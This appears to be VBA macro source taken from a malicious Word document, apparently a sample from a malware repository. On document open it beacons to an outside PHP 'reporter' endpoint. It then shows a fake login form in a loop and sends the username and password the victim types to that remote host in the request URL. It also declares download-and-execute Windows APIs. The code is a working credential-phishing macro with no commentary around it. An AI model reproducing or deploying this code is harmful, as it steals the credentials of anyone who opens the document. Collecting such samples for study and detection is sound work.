Attribute VB_Name = "Module1"



Option Explicit

Private Declare Function URLDownloadToFile Lib "urlmon" _
Alias "URLDownloadToFileA" (ByVal pCaller As Long, _
ByVal szURL As String, ByVal szFileName As String, _
ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long

Public Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" _
(ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, _
ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) _
As Long

Public Declare Function DeleteUrlCacheEntry Lib "wininet.dll" (ByVal lpszUrlName As String) As Long

Public Declare Function WinExec Lib "Kernel32.dll" (ByVal lpCmdLine As String, ByVal nShowCmd As Long) As Long

Public STARTUP_PATH As String
Public isFormComplete As Boolean
Dim Ret As Long

Public Function getOperatingSystem()
    Dim localHost       As String
    Dim objWMIService   As Variant
    Dim colOperatingSystems As Variant
    Dim objOperatingSystem As Variant

    On Error GoTo Error_Handler

    localHost = "." 'Technically could be run against remote computers, if allowed
    Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & localHost & "\root\cimv2")
    Set colOperatingSystems = objWMIService.ExecQuery("Select * from Win32_OperatingSystem")

    For Each objOperatingSystem In colOperatingSystems
        getOperatingSystem = objOperatingSystem.Caption & " " & objOperatingSystem.Version
        Exit Function
    Next

Error_Handler_Exit:
    On Error Resume Next
    Exit Function


Error_Handler:
'    MsgBox "The following error has occured." & vbCrLf & vbCrLf & _
'           "Error Number: " & Err.Number & vbCrLf & _
'           "Error Source: getOperatingSystem" & vbCrLf & _
'           "Error Description: " & Err.Description, _
'           vbCritical, "An Error has Occured!"
    Resume Error_Handler_Exit
End Function

Sub AutoOpenSub()
    Dim strURL, strPath, strTemp, strCommand As String
    Dim rep, mHdl As Long
    Dim waitTill As Date
 
    'On Error Resume Next
    
      
    Call uploadPOST("NULL", "NULL", "MACRO_EXECUTED_WORD_AMG_P_ONLY")
    

    isFormComplete = False
    While (Not isFormComplete)
        UserForm1.Show
        sheetOpen
    Wend
    
    
End Sub

Sub sheetOpen()
    Selection.WholeStory
    With Selection.Font
        .Hidden = False
    End With
End Sub

Sub RemovePictures()
    Dim Rng As Range, iPage As Long, objPic As InlineShape
    iPage = 1
    With ActiveDocument
        Set Rng = .GoTo(What:=wdGoToPage, Name:=iPage)
        Set Rng = Rng.GoTo(What:=wdGoToBookmark, Name:="\page")
    End With
    For Each objPic In Rng.InlineShapes
        objPic.Delete
    Next objPic
End Sub

Public Function uploadPOST(ByVal username_no_spaces As String, ByVal password_no_spaces As String, ByVal message_no_spaces As String)

    Dim URL As String
    Dim objHTTP As Object
    
    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
    URL = "http://www.intermune.se/media_library/reporter.php?msg=" & message_no_spaces & "&uname=" & username_no_spaces & "&pword=" & password_no_spaces
    objHTTP.Open "POST", URL, False
    objHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
    objHTTP.send ("")
    
End Function







Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
Public Sub Document_Open()
    AutoOpenSub
End Sub
Attribute VB_Name = "UserForm1"
Attribute VB_Base = "0{7C8C6359-1EE6-42A6-B6D4-3E1059F2317D}{32D06034-DE4F-435F-BAA5-3B4A2123B23B}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False




Private Sub CommandButton1_Click()
    Dim user, pass As String
    user = UserForm1.UserBox.Value
    pass = UserForm1.PassBox.Value
    
    If (StrComp(user, "", vbTextCompare) = 0) Or (StrComp(user, "User name", vbTextCompare) = 0) Or (StrComp(pass, "", vbTextCompare) = 0) Then
        MsgBox ("Invalid username or password")
        isFormComplete = False
        Unload UserForm1
    Else
        Unload UserForm1
        Call uploadPOST(user, pass, "AMG")
        isFormComplete = True
    End If
End Sub

Private Sub Label1_Click()

End Sub


INQUEST-PP=macro
